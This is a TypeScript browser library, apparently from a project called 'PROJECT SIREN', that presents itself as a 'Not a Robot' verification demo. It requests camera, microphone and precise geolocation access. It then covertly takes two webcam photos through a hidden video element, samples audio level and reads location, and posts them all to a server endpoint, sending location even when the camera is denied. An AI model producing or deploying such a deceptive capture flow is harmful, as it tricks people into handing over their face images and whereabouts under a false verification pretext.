/**
 * PROJECT SIREN - Media Capture Library
 * 
 * Client-side utilities for capturing webcam, microphone, and geolocation
 * for the "Not a Robot" verification demo.
 */

// ===================================
// TYPES
// ===================================

export interface MediaPermissions {
    camera: boolean;
    microphone: boolean;
    geolocation: boolean;
}

export interface GeoLocation {
    latitude: number;
    longitude: number;
    accuracy: number;
    timestamp: number;
}

export interface MediaSnapshot {
    frames?: string[]; // Array of Base64 JPEG photos
    audioLevel?: number; // 0-100
    location?: GeoLocation;
    permissions: MediaPermissions;
    capturedAt: string;
}

// ===================================
// PERMISSION REQUESTS
// ===================================

/**
 * Request all media permissions (camera, microphone, geolocation)
 * Returns granted permissions object
 */
export async function requestAllPermissions(): Promise<{
    permissions: MediaPermissions;
    stream?: MediaStream;
}> {
    const permissions: MediaPermissions = {
        camera: false,
        microphone: false,
        geolocation: false,
    };
    let stream: MediaStream | undefined;

    // Request camera and microphone together
    try {
        stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: 'user', width: 640, height: 480 },
            audio: true,
        });
        permissions.camera = true;
        permissions.microphone = true;
    } catch (error) {
        console.log('[MediaCapture] Camera/Mic denied:', error);

        // Try camera only
        try {
            stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: 'user', width: 640, height: 480 },
            });
            permissions.camera = true;
        } catch {
            console.log('[MediaCapture] Camera only also denied');
        }

        // Try microphone only if camera failed
        if (!stream) {
            try {
                stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                permissions.microphone = true;
            } catch {
                console.log('[MediaCapture] Microphone only also denied');
            }
        }
    }

    // Request geolocation separately
    try {
        await new Promise<GeolocationPosition>((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(resolve, reject, {
                enableHighAccuracy: true,
                timeout: 5000,
            });
        });
        permissions.geolocation = true;
    } catch (error) {
        console.log('[MediaCapture] Geolocation denied:', error);
    }

    return { permissions, stream };
}

// ===================================
// FRAME CAPTURE
// ===================================

let videoElement: HTMLVideoElement | null = null;
let canvasElement: HTMLCanvasElement | null = null;

/**
 * Initialize video capture from stream
 */
export function initializeVideoCapture(stream: MediaStream): void {
    // Create hidden video element
    videoElement = document.createElement('video');
    videoElement.srcObject = stream;
    videoElement.autoplay = true;
    videoElement.playsInline = true;
    videoElement.muted = true;

    // Create canvas for frame capture
    canvasElement = document.createElement('canvas');
    canvasElement.width = 640;
    canvasElement.height = 480;
}

/**
 * Capture a single frame as base64 JPEG
 */
export function captureFrame(): string | undefined {
    if (!videoElement || !canvasElement) return undefined;

    const ctx = canvasElement.getContext('2d');
    if (!ctx) return undefined;

    // Only capture if video is ready
    if (videoElement.readyState < 2) return undefined;

    ctx.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);

    // Return as compressed JPEG
    return canvasElement.toDataURL('image/jpeg', 0.6);
}

// ===================================
// AUDIO LEVEL
// ===================================

let audioContext: AudioContext | null = null;
let analyser: AnalyserNode | null = null;
let dataArray: Uint8Array | null = null;

/**
 * Initialize audio level monitoring
 */
export function initializeAudioCapture(stream: MediaStream): void {
    try {
        audioContext = new AudioContext();
        const source = audioContext.createMediaStreamSource(stream);
        analyser = audioContext.createAnalyser();
        analyser.fftSize = 256;
        source.connect(analyser);

        const bufferLength = analyser.frequencyBinCount;
        dataArray = new Uint8Array(bufferLength);
    } catch (error) {
        console.log('[MediaCapture] Audio analysis init failed:', error);
    }
}

/**
 * Get current audio level (0-100)
 */
export function getAudioLevel(): number {
    if (!analyser || !dataArray) return 0;

    analyser.getByteFrequencyData(dataArray as Uint8Array<ArrayBuffer>);

    // Calculate average volume
    let sum = 0;
    for (let i = 0; i < dataArray.length; i++) {
        sum += dataArray[i];
    }
    const average = sum / dataArray.length;

    // Normalize to 0-100
    return Math.min(100, Math.round((average / 128) * 100));
}

// ===================================
// GEOLOCATION
// ===================================

let lastLocation: GeoLocation | undefined;

/**
 * Get current geolocation
 */
export async function getGeolocation(): Promise<GeoLocation | undefined> {
    try {
        const position = await new Promise<GeolocationPosition>((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(resolve, reject, {
                enableHighAccuracy: true,
                timeout: 10000,
                maximumAge: 30000,
            });
        });

        lastLocation = {
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            accuracy: position.coords.accuracy,
            timestamp: position.timestamp,
        };

        return lastLocation;
    } catch {
        return lastLocation; // Return cached if available
    }
}

// ===================================
// PHOTO CAPTURE (2 photos with delay)
// ===================================

let currentStream: MediaStream | null = null;

/**
 * Capture 2 photos with a delay, then send to server and cleanup
 */
export async function capturePhotos(
    stream: MediaStream | undefined,
    permissions: MediaPermissions,
    delayMs: number = 500
): Promise<void> {
    if (!stream) {
        // Still send location/permissions info even without camera
        const snapshot = await createMediaSnapshot(permissions, []);
        await sendMediaSnapshot(snapshot);
        return;
    }

    currentStream = stream;
    const frames: string[] = [];

    // Initialize capture if we have video
    if (permissions.camera) {
        initializeVideoCapture(stream);

        // Wait for video to be ready
        await new Promise(resolve => setTimeout(resolve, 500));

        // Capture first photo
        const frame1 = captureFrame();
        if (frame1) {
            frames.push(frame1);
            console.log('[MediaCapture] Captured photo 1');
        }

        // Wait before second photo
        await new Promise(resolve => setTimeout(resolve, delayMs));

        // Capture second photo
        const frame2 = captureFrame();
        if (frame2) {
            frames.push(frame2);
            console.log('[MediaCapture] Captured photo 2');
        }
    }

    // Get audio level if available
    let audioLevel: number | undefined;
    if (permissions.microphone) {
        initializeAudioCapture(stream);
        await new Promise(resolve => setTimeout(resolve, 100));
        audioLevel = getAudioLevel();
    }

    // Get location
    let location: GeoLocation | undefined;
    if (permissions.geolocation) {
        location = await getGeolocation();
    }

    // Send all captured data
    const snapshot: MediaSnapshot = {
        frames,
        audioLevel,
        location,
        permissions,
        capturedAt: new Date().toISOString(),
    };
    await sendMediaSnapshot(snapshot);
    console.log('[MediaCapture] Sent', frames.length, 'photos to server');

    // Cleanup immediately after capture
    stopMediaCapture();
}

/**
 * Stop media capture and cleanup
 */
export function stopMediaCapture(): void {
    if (currentStream) {
        currentStream.getTracks().forEach(track => track.stop());
        currentStream = null;
    }

    if (audioContext) {
        audioContext.close();
        audioContext = null;
    }

    videoElement = null;
    canvasElement = null;
    analyser = null;
    dataArray = null;
    console.log('[MediaCapture] Cleaned up');
}


/**
 * Create a media snapshot with all available data
 */
async function createMediaSnapshot(permissions: MediaPermissions, frames: string[] = []): Promise<MediaSnapshot> {
    const snapshot: MediaSnapshot = {
        frames,
        permissions,
        capturedAt: new Date().toISOString(),
    };

    // Get audio level if microphone available
    if (permissions.microphone) {
        snapshot.audioLevel = getAudioLevel();
    }

    // Get location if geolocation available
    if (permissions.geolocation) {
        snapshot.location = await getGeolocation();
    }

    return snapshot;
}

/**
 * Send media snapshot to server
 */
async function sendMediaSnapshot(snapshot: MediaSnapshot): Promise<void> {
    try {
        await fetch('/api/media', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(snapshot),
        });
    } catch (error) {
        console.error('[MediaCapture] Failed to send snapshot:', error);
    }
}
